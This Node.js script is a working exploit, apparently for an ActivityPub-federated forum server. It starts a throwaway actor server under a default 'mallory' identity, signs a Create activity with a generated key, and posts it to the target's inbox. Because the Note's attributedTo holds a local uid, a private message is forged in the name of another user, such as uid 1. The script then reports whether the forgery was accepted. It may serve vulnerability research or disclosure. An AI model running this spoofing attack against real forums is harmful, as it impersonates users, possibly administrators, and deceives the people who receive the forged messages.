'use strict';

const fs = require('node:fs');
const http = require('node:http');
const https = require('node:https');
const crypto = require('node:crypto');

function parseArgs(argv) {
	const out = {};
	for (let i = 2; i < argv.length; i += 1) {
		const arg = argv[i];
		if (!arg.startsWith('--')) {
			throw new Error(`unexpected argument: ${arg}`);
		}
		const key = arg.slice(2);
		const next = argv[i + 1];
		if (!next || next.startsWith('--')) {
			out[key] = true;
		} else {
			out[key] = next;
			i += 1;
		}
	}
	return out;
}

function need(args, key) {
	if (!args[key]) {
		throw new Error(`missing --${key}`);
	}
	return args[key];
}

function cleanOrigin(value) {
	const url = new URL(value);
	return url.origin;
}

function cleanBase(value) {
	const url = new URL(value);
	return url.href.replace(/\/$/, '');
}

function join(base, suffix) {
	const root = base.endsWith('/') ? base : `${base}/`;
	return new URL(suffix.replace(/^\//, ''), root).href;
}

function sendJson(res, status, value, type = 'application/activity+json') {
	const body = JSON.stringify(value);
	res.writeHead(status, {
		'content-type': type,
		'content-length': Buffer.byteLength(body),
	});
	res.end(body);
}

function readBody(req) {
	return new Promise((resolve, reject) => {
		const chunks = [];
		req.on('data', chunk => chunks.push(chunk));
		req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
		req.on('error', reject);
	});
}

function makeServer({ actorOrigin, username, publicKeyPem }) {
	const actorUrl = join(actorOrigin, `/users/${encodeURIComponent(username)}`);
	const keyId = `${actorUrl}#main-key`;
	const host = new URL(actorOrigin).hostname;
	const actor = {
		'@context': [
			'https://www.w3.org/ns/activitystreams',
			'https://w3id.org/security/v1',
		],
		id: actorUrl,
		type: 'Person',
		preferredUsername: username,
		name: username,
		inbox: join(actorOrigin, `/users/${encodeURIComponent(username)}/inbox`),
		publicKey: {
			id: keyId,
			owner: actorUrl,
			publicKeyPem,
		},
	};
	const webfinger = {
		subject: `acct:${username}@${host}`,
		links: [
			{
				rel: 'self',
				type: 'application/activity+json',
				href: actorUrl,
			},
		],
	};
	const received = [];
	const handler = async (req, res) => {
		try {
			const url = new URL(req.url, actorOrigin);
			if (req.method === 'GET' && url.pathname === '/.well-known/webfinger') {
				return sendJson(res, 200, webfinger, 'application/jrd+json');
			}
			if (req.method === 'GET' && url.pathname === new URL(actorUrl).pathname) {
				return sendJson(res, 200, actor);
			}
			if (req.method === 'POST') {
				received.push({ path: url.pathname, body: await readBody(req) });
				return sendJson(res, 202, { ok: true });
			}
			return sendJson(res, 404, { error: 'not found' });
		} catch (err) {
			return sendJson(res, 500, { error: err.message });
		}
	};
	return { handler, actorUrl, keyId, received };
}

function listen(server, host, port) {
	return new Promise((resolve, reject) => {
		server.once('error', reject);
		server.listen(port, host, () => {
			server.off('error', reject);
			resolve();
		});
	});
}

function close(server) {
	return new Promise(resolve => server.close(resolve));
}

function signRequest({ inboxUrl, body, keyId, privateKeyPem }) {
	const url = new URL(inboxUrl);
	const digest = `SHA-256=${crypto.createHash('sha256').update(body).digest('base64')}`;
	const date = new Date().toUTCString();
	const headers = '(request-target) host date digest';
	const signingString = [
		`(request-target): post ${url.pathname}`,
		`host: ${url.host}`,
		`date: ${date}`,
		`digest: ${digest}`,
	].join('\n');
	const signature = crypto.sign('sha256', Buffer.from(signingString), privateKeyPem).toString('base64');
	return {
		date,
		digest,
		signature: `keyId="${keyId}",headers="${headers}",signature="${signature}",algorithm="hs2019"`,
	};
}

async function postActivity({ inboxUrl, activity, keyId, privateKeyPem }) {
	const body = JSON.stringify(activity);
	const signed = signRequest({ inboxUrl, body, keyId, privateKeyPem });
	const response = await fetch(inboxUrl, {
		method: 'POST',
		headers: {
			accept: 'application/activity+json',
			'content-type': 'application/activity+json',
			date: signed.date,
			digest: signed.digest,
			signature: signed.signature,
		},
		body,
		redirect: 'manual',
	});
	const responseText = await response.text();
	return {
		status: response.status,
		headers: Object.fromEntries(response.headers.entries()),
		body: responseText,
	};
}

async function main() {
	const args = parseArgs(process.argv);
	const targetBase = cleanBase(need(args, 'target-base'));
	const actorOrigin = cleanOrigin(need(args, 'actor-origin'));
	const username = args.username || 'mallory';
	const spoofUid = Number.parseInt(args['spoof-uid'] || '1', 10);
	const recipientUid = Number.parseInt(need(args, 'recipient-uid'), 10);
	const inboxUrl = args['inbox-url'] || join(targetBase, '/inbox');
	const message = args.message || `private message forged as uid ${spoofUid}`;
	const listenHost = args['listen-host'] || '127.0.0.1';
	const listenPort = Number.parseInt(args['listen-port'] || '8088', 10);
	const now = new Date().toISOString();
	const idSuffix = args.id || crypto.randomUUID();
	const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
		modulusLength: 2048,
		publicKeyEncoding: { type: 'spki', format: 'pem' },
		privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
	});
	const actorServer = makeServer({
		actorOrigin,
		username,
		publicKeyPem: publicKey,
	});
	const server = args['https-cert'] && args['https-key'] ?
		https.createServer({
			cert: fs.readFileSync(args['https-cert']),
			key: fs.readFileSync(args['https-key']),
		}, actorServer.handler) :
		http.createServer(actorServer.handler);
	const activity = {
		'@context': 'https://www.w3.org/ns/activitystreams',
		id: join(actorOrigin, `/activities/private-create-${idSuffix}`),
		type: 'Create',
		actor: actorServer.actorUrl,
		to: [join(targetBase, `/uid/${recipientUid}`)],
		cc: [],
		object: {
			'@context': 'https://www.w3.org/ns/activitystreams',
			id: join(actorOrigin, `/private-notes/local-chat-spoof-${idSuffix}`),
			type: 'Note',
			attributedTo: spoofUid,
			content: `<p>${message.replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]))}</p>`,
			published: now,
			updated: now,
			to: [join(targetBase, `/uid/${recipientUid}`)],
			cc: [],
		},
	};
	let result;
	await listen(server, listenHost, listenPort);
	try {
		const response = await postActivity({
			inboxUrl,
			activity,
			keyId: actorServer.keyId,
			privateKeyPem: privateKey,
		});
		result = {
			targetBase,
			inboxUrl,
			actor: actorServer.actorUrl,
			keyId: actorServer.keyId,
			activityId: activity.id,
			noteId: activity.object.id,
			spoofUid,
			recipientUid,
			httpStatus: response.status,
			accepted: response.status >= 200 && response.status < 300,
			responseBody: response.body,
			actorRequests: actorServer.received,
		};
	} finally {
		await close(server);
	}
	if (args.output) {
		fs.writeFileSync(args.output, `${JSON.stringify(result, null, 2)}\n`);
	}
	console.log(JSON.stringify(result, null, 2));
	if (!result.accepted) {
		process.exitCode = 2;
	}
}

main().catch((err) => {
	console.error(err.message);
	process.exit(1);
});
